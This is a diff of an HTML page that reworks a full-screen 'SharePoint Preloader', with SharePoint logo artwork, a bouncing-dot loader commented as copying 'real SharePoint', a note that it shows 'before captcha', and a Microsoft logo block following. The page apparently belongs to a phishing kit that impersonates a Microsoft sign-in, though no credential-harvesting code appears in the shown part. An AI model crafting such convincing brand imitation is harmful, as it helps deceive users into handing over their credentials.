@@ -203,16 +203,26 @@
 
 <body>
 
-    <!-- SharePoint Preloader - renders immediately before any JS -->
-    <div class="preloader-overlay" id="preloaderOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;display:flex;justify-content:center;align-items:center;flex-direction:column;z-index:99999;">
-        <svg width="140" height="140" viewBox="0 0 180 180" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <!-- SharePoint Preloader - full screen loading screen shown before captcha -->
+    <div id="preloaderOverlay" class="preloader-overlay" style="background:#f3f2f1;font-family:'Segoe UI',sans-serif;">
+        <svg width="80" height="80" viewBox="0 0 180 180" fill="none" xmlns="http://www.w3.org/2000/svg">
             <path d="M87.1875 118.125C116.7 118.125 140.625 94.2002 140.625 64.6875C140.625 35.1748 116.7 11.25 87.1875 11.25C57.6748 11.25 33.75 35.1748 33.75 64.6875C33.75 94.2002 57.6748 118.125 87.1875 118.125Z" fill="#0e5c5e"/>
             <path d="M135 140.625C159.853 140.625 180 120.478 180 95.625C180 70.7722 159.853 50.625 135 50.625C110.147 50.625 90 70.7722 90 95.625C90 120.478 110.147 140.625 135 140.625Z" fill="#1d9097"/>
             <path d="M92.8125 168.75C113.005 168.75 129.375 152.38 129.375 132.188C129.375 111.995 113.005 95.625 92.8125 95.625C72.6196 95.625 56.25 111.995 56.25 132.188C56.25 152.38 72.6196 168.75 92.8125 168.75Z" fill="#29bbc2"/>
             <path d="M90 39.375H11.25C5.0368 39.375 0 44.4118 0 50.625V129.375C0 135.588 5.0368 140.625 11.25 140.625H90C96.2132 140.625 101.25 135.588 101.25 129.375V50.625C101.25 44.4118 96.2132 39.375 90 39.375Z" fill="#116b6e"/>
             <path d="M73.125 101.941C73.125 93.2209 67.2761 89.3717 55.1062 84.8936C45.5779 81.3583 43.3137 80.3368 43.3137 76.959C43.3137 74.052 46.1438 72.0878 50.9552 72.0878C55.8609 72.0878 60.4834 73.7376 65.6724 76.5658L70.9554 67.2171C65.3889 63.7605 58.7852 61.875 50.7665 61.875C38.5023 61.875 29.7288 68.1598 29.7288 77.7443C29.7288 87.5644 36.7099 90.7071 48.408 94.8707C57.7474 98.1703 59.5401 99.8201 59.5401 102.727C59.5401 106.184 56.2382 107.912 51.0495 107.912C44.9174 107.912 39.5401 105.791 34.1628 102.334L28.125 111.29C34.7288 115.847 42.9363 118.125 51.3326 118.125C63.9742 118.125 73.125 112.154 73.125 101.941Z" fill="white"/>
         </svg>
-        <div style="width:32px;height:32px;margin-top:20px;border:3px solid #e1dfdd;border-top-color:#038387;border-radius:50%;animation:preloader-spin 0.8s linear infinite;"></div>
+        <!-- Five-dot bouncing loader like real SharePoint -->
+        <div style="display:flex;gap:6px;margin-top:28px;">
+            <style>
+                @keyframes sp-bounce{0%,80%,100%{transform:scale(0);opacity:.3}40%{transform:scale(1);opacity:1}}
+            </style>
+            <div style="width:8px;height:8px;border-radius:50%;background:#038387;animation:sp-bounce 1.4s infinite ease-in-out both;animation-delay:-0.32s;"></div>
+            <div style="width:8px;height:8px;border-radius:50%;background:#038387;animation:sp-bounce 1.4s infinite ease-in-out both;animation-delay:-0.16s;"></div>
+            <div style="width:8px;height:8px;border-radius:50%;background:#038387;animation:sp-bounce 1.4s infinite ease-in-out both;"></div>
+            <div style="width:8px;height:8px;border-radius:50%;background:#038387;animation:sp-bounce 1.4s infinite ease-in-out both;animation-delay:0.16s;"></div>
+            <div style="width:8px;height:8px;border-radius:50%;background:#038387;animation:sp-bounce 1.4s infinite ease-in-out both;animation-delay:0.32s;"></div>
+        </div>
     </div>
     <div class="container">
         <!-- Microsoft Logo -->
